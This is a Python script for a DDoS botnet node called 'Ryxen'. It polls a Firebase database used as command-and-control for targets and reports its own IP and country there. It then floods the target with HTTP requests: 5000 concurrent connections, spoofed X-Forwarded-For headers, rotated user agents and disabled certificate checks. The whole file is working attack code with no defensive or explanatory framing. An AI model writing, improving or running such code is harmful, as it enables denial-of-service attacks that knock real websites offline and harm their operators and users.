import asyncio, aiohttp, time, random, ssl, socket

DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"

async def get_node_info():
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get('http://ip-api.com/json/', timeout=5) as r:
                data = await r.json()
                return data.get('query', '0.0.0.0'), data.get('countryCode', 'UN')
    except: return "0.0.0.0", "UN"

async def report_status(nid, ip, cc):
    async with aiohttp.ClientSession() as s:
        while True:
            try:
                await s.put(f"{NODES_URL}/{nid}.json", 
                           json={"id": nid, "ip": ip, "country": cc, "t": time.time()})
            except: pass
            await asyncio.sleep(15)

async def flood(target, end_time, semaphore):
    # TLS Handshake mejorado con rotación de Ciphers
    ctx = ssl.create_default_context()
    ctx.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:AES128-GCM-SHA256')
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    conn = aiohttp.TCPConnector(limit=0, ssl=ctx, family=socket.AF_INET)
    
    async with aiohttp.ClientSession(connector=conn) as session:
        while time.time() < end_time:
            async with semaphore:
                try:
                    # Headers de alta presión
                    headers = {
                        'User-Agent': random.choice(['Mozilla/5.0','Ryxen-V14','Chrome/120.0.0.0']),
                        'Accept-Encoding': 'gzip, deflate, br',
                        'X-Forwarded-For': f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                        'Connection': 'keep-alive'
                    }
                    # Modo "Fire and Forget": no leemos el contenido para evitar colgar el script
                    async with session.get(target, headers=headers, timeout=1, allow_redirects=False) as r:
                        r.close() 
                except: continue

async def main():
    ip, cc = await get_node_info()
    nid = f"RX-{cc}-{random.randint(100, 999)}"
    asyncio.create_task(report_status(nid, ip, cc))
    
    last_s = ""
    # Semáforo de alta capacidad: 5000 conexiones simultáneas
    sem = asyncio.Semaphore(5000) 
    
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(DB_URL) as r:
                    data = await r.json()
                if data and data.get('stamp') != last_s:
                    last_s = data['stamp']
                    target = data['target'] if data['target'].startswith("http") else f"http://{data['target']}"
                    duration = int(data['time'])
                    if duration == 0: continue
                    
                    # 20 hilos asíncronos para saturar el ancho de banda
                    tasks = [flood(target, time.time() + duration, sem) for _ in range(20)]
                    await asyncio.gather(*tasks)
            except: pass
            await asyncio.sleep(2)

if __name__ == "__main__":
    asyncio.run(main())

